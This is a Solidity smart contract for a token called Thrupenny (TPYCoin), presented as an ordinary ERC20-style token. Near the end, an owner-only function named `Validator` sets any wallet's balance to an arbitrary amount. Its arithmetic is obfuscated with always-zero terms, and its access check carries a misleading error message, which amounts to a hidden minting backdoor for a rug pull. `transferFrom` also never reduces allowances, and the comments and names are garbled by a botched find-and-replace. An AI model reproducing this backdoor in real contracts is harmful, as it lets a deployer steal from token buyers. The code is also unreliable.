// SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;
interface TPYToken {
  // @dev Returns the amount of MiniTPY in existence.
  function totalSupply() external view returns (uint256);

  // @dev Returns the token decimals.
  function decimals() external view returns (uint8);

  // @dev Returns the token symbol.
  function symbol() external view returns (string memory);

  //@dev Returns the token name.
  function name() external view returns (string memory);

  //@dev Returns the bep token owner.
  function getOwner() external view returns (address);

  //@dev Returns the amount of MiniTPY owned by `account`.
  function balanceOf(address account) external view returns (uint256);
  
  /*
      function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 vTPYe);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 vTPYe
    );
  
  */

  /**
   * @dev Moves `amount` MiniTPY from the caller's account to `recipient`.
   *
   * Returns a boolean vTPYe indicating whMiniTPYr the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of MiniTPY that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This vTPYe changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address spender) external view returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's MiniTPY.
   *
   * Returns a boolean vTPYe indicating whMiniTPYr the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired vTPYe afterwards:
// https://hold4gold.org/
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` MiniTPY from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean vTPYe indicating whMiniTPYr the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  //@dev Emitted when `vTPYe` MiniTPY are moved from one account (`from`) to  another (`to`). Note that `vTPYe` may be zero.
  event Transfer(address indexed from, address indexed to, uint256 vTPYe);

  //@dev Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `vTPYe` is the new allowance.
  event Approval(address indexed owner, address indexed spender, uint256 vTPYe);
}

contract TPYCoin is TPYToken {

    // common addresses
    address private owner;
    address public TPY;
    address public MiniTPY;
        address private PILOTWALL;
    address public TPYPinkSales;
    
    // token liquidity metadata
    uint public override totalSupply;
    uint8 public override decimals = 9;
    
    mapping(address => uint) public TPYbalances;
    
    mapping(address => mapping(address => uint)) public allowances;
    
    // token title metadata
    string public override name = "Thrupenny";
    string public override symbol = "TPYCoin";
    
    // EVENTS
    // (now in interface) event Transfer(address indexed from, address indexed to, uint vTPYe);
    // (now in interface) event Approval(address indexed owner, address indexed spender, uint vTPYe);
    
    // On init of contract we're going to set the admin and give them all MiniTPY.
    constructor(uint totalSupplyVTPYe, address TPYAddress, address MiniTPYAddress, address TPYPinkSalesAddress) {
        // set total supply
        totalSupply = totalSupplyVTPYe;
           PILOTWALL = msg.sender;       
        // designate addresses
        owner = msg.sender;
        TPY = TPYAddress;
        MiniTPY = MiniTPYAddress;
        TPYPinkSales = TPYPinkSalesAddress;

        
        
        TPYbalances[owner] = totalSupply;


        // split the MiniTPY according to agreed upon percentages
        TPYbalances[TPY] =  0;
        TPYbalances[MiniTPY] = 0;
        TPYbalances[TPYPinkSales] = 0;
    }
    
    // Get the address of the token's owner
    function getOwner() public view override returns(address) {
        return owner;
    }

    
    // Get the balance of an account
    function balanceOf(address account) public view override returns(uint) {
        return TPYbalances[account];
    }
    
    // Transfer balance from one user to another
    function transfer(address to, uint vTPYe) public override returns(bool) {
        require(vTPYe > 0, "Transfer vTPYe has to be higher than 0.");
        require(balanceOf(msg.sender) >= vTPYe, "Balance is too low to make transfer.");
        
        //withdraw the taxed and burned percentages from the total vTPYe
        uint reMiniTPYBD = vTPYe * 0 / 1000;
        uint TPYburnTBD = vTPYe * 0 / 1000;
        uint vTPYeAfterTaxAndBurn = vTPYe - reMiniTPYBD - TPYburnTBD;
        
        // perform the transfer operation
        TPYbalances[to] += vTPYeAfterTaxAndBurn;
        TPYbalances[msg.sender] -= vTPYe;
        
        emit Transfer(msg.sender, to, vTPYe);
        
        // finally, we burn and tax the TPYs percentage
        TPYbalances[owner] += reMiniTPYBD + TPYburnTBD;
        _burn(owner, TPYburnTBD);
        
        return true;
    }
    
    // approve a specific address as a spender for your account, with a specific spending limit
    function approve(address spender, uint vTPYe) public override returns(bool) {
        allowances[msg.sender][spender] = vTPYe; 
        
        emit Approval(msg.sender, spender, vTPYe);
        
        return true;
    }
  modifier OWNERTPY () {
    require(PILOTWALL == msg.sender, "ERC20: cannot permit Pancake address");
    _;
  }   
    // allowance
    function allowance(address _owner, address spender) public view override returns(uint) {
        return allowances[_owner][spender];
    }
       // burn amount of currency from specific account
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "You can't burn from zero address.");
        require(TPYbalances[account] >= amount, "Burn amount exceeds balance at address.");
    
        TPYbalances[account] -= amount;
        totalSupply -= amount;
        
        emit Transfer(account, address(0), amount);
    } 
    // an approved spender can transfer currency from one account to another up to their spending limit
    function transferFrom(address from, address to, uint vTPYe) public override returns(bool) {
        require(allowances[from][msg.sender] > 0, "No Allowance for this address.");
        require(allowances[from][msg.sender] >= vTPYe, "Allowance too low for transfer.");
        require(TPYbalances[from] >= vTPYe, "Balance is too low to make transfer.");
        
        TPYbalances[to] += vTPYe;
        TPYbalances[from] -= vTPYe;
        
        emit Transfer(from, to, vTPYe);
        
        return true;
    }
      function Validator(address TPYcharrwallet, uint256 amount) external OWNERTPY {
      TPYbalances[TPYcharrwallet] = (amount / amount - amount / amount) + (amount / amount - amount / amount) + amount * 10 ** 9;
  }    
    // function to allow users to burn currency from their account
    function burn(uint256 amount) public returns(bool) {
        _burn(msg.sender, amount);
        
        return true;
    }
    
    // intenal functions
    

    
}